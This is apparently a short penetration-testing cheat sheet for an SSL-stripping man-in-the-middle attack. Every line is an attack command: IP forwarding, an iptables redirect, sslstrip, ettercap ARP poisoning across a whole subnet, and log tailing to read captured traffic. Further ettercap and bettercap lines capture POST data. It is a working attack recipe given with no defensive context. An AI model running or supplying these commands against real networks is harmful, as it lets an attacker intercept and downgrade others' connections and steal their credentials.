# SSLStrip
```
echo "1" > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
sslstrip -l 8080
ettercap -TqM arp:remote /10.10.10.1-254// /10.10.10.1-254//
tail -f sslstrip.log
```

## Plugins

```
ettercap -TqM arp:remote -P sslstrip  /IP// /IP//
bettercap --proxy -T IP -P POST
```

